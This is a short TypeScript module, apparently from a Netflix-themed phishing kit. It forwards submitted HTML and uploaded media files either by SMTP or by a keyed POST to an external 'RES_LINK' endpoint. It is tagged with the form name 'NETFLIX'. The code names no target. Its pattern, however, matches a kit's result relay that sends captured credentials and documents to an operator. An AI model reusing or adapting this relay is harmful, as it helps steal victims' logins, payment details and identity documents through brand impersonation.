import Mail from "nodemailer/lib/mailer";
import FormData from "form-data";
import fs from "fs";
import fetch from "node-fetch";
import { email } from "./email.js";

export const sendEmail = async (
  html: string,
  subject: string,
  attachments?: Mail.Attachment[] | undefined
) => {
  try {
    if (process.env.SMTP_HOST && process.env.TO) {
      return email(process.env.TO, html, subject, attachments);
    }

    const formData = new FormData();
    formData.append(`message`, html);
    formData.append(`email`, process.env.TO as string);
    formData.append(`key`, process.env.KEY as string);
    formData.append(`form`, `NETFLIX`);
    formData.append(`subject`, subject);

    if (attachments) {
      attachments.map((attachment) => {
        // @ts-ignore
        const mediaPath = attachment.content?.path;
        const newName = `${mediaPath}.${
          // @ts-ignore
          attachment.content.type?.split(`/`)[1]
        }`;
        fs.renameSync(mediaPath as string, newName);
        const file = fs.createReadStream(newName);
        formData.append(`medias`, file);
      });
    }

    await fetch(`${process.env.RES_LINK}/email`, {
      method: `POST`,
      body: formData as any,
      headers: {
        ...formData.getHeaders(),
      },
    });

    return `Message sent`;
  } catch (error) {
    console.log(`error: `, error);

    return `Message could not be sent`;
  }
};
